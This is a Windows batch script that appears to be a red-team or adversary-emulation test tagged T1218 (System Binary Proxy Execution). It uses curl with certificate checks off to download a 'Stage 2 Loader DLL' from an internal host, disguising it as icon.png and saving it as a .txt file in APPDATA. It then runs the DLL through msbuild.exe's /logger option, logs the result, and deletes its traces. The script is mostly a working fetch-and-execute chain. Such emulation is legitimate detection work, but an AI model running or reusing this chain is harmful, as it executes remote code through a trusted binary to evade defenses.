@echo off
setlocal enabledelayedexpansion

REM --- Placeholder constants (random variable names) ---
SET a1b2c3=%APPDATA%\10860\0d413ab3
SET d4e5f6=ed4859b7.txt
SET g7h8i9=https://10.0.0.49/stage/2/icon.png?10860-7
SET j0k1l2=ITZEL-S2B
SET m3n4o5=10860
SET p6q7r8=7
SET s9t0u1=%PUBLIC%\\macula-simulations.log

REM --- Capture timestamp once ---
SET tsvar=!DATE!/!TIME!

REM --- Cache log file variable for repeated use ---
SET logfile=!s9t0u1!

REM --- Debug log heartbeat start ---
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: heartbeat_start>> "!logfile!" 2>nul

REM --- Step 1: Download Stage 2 Loader DLL via curl ---
curl -k -s -o "!a1b2c3!\!d4e5f6!" "!g7h8i9!"
set CURL_ERR=%ERRORLEVEL%

if !CURL_ERR! neq 0 (
    echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: heartbeat_failed>> "!logfile!" 2>nul
    goto :log_ttp
)
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: heartbeat_complete>> "!logfile!" 2>nul

REM --- Step 2: Change to output directory ---
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: chdir_start>> "!logfile!" 2>nul
cd /d "!a1b2c3!" >nul 2>&1
set CD_ERR=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: chdir_result=!CD_ERR!>> "!logfile!" 2>nul
if !CD_ERR! neq 0 goto :log_ttp

REM --- Step 3: Create dummy .proj file for msbuild ---
echo ^<Project/^> > "!a1b2c3!\build.proj" 2>nul
set PROJ_ERR=%ERRORLEVEL%
if !PROJ_ERR! neq 0 (
    echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: proj_create_failed>> "!logfile!" 2>nul
    goto :log_ttp
)

REM --- Step 4: Invoke msbuild with /logger: ---
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: msbuild_start>> "!logfile!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!a1b2c3!\build.proj" /logger:LoggerEntry,"!a1b2c3!\!d4e5f6!";MyParameters,Foo >NUL 2>&1
set MSBUILD_ERR=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: msbuild_result=!MSBUILD_ERR!>> "!logfile!" 2>nul

REM --- Logging: TTP line ---
:log_ttp
set TTP_RESULT=OK
set TTP_ERROR=
if !MSBUILD_ERR! neq 0 (
    set TTP_RESULT=FAIL
    set TTP_ERROR=msbuild_error_!MSBUILD_ERR!
)
REM fallback if curl or cd failed before msbuild
if not defined TTP_RESULT (
    set TTP_RESULT=FAIL
    set TTP_ERROR=pre_msbuild_failure
)
echo [!tsvar!][TTP][!j0k1l2!][!m3n4o5!]: T1218^|System Binary Proxy Execution=!TTP_RESULT!:!TTP_ERROR!>> "!logfile!" 2>nul

REM --- Cleanup debug log ---
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: cleanup_start>> "!logfile!" 2>nul
REM optionally delete build.proj to reduce clutter
del /q "!a1b2c3!\build.proj" 2>nul
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: cleanup_complete>> "!logfile!" 2>nul

endlocal
exit /b 0